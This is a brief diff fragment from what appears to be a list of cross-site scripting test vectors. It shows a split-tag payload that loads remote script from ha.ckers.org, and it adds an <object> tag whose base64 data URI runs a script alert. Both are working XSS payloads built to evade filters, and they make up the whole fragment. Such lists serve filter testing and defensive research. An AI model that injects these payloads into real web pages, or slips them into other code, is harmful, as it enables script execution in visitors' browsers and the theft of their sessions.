@@ -325,4 +325,4 @@ XML SRC="xsstest.xml" ID=I></XML>
 
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>\\
 
-
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
